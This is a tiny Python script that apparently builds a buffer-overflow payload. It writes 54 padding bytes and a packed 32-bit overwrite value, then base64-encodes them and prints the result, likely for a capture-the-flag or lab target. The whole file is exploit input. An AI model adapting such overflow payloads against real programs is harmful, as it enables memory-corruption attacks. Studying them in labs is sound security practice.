
import sys
import struct
import base64

buf = b'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'
buf += struct.pack('<I', 2376417645)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
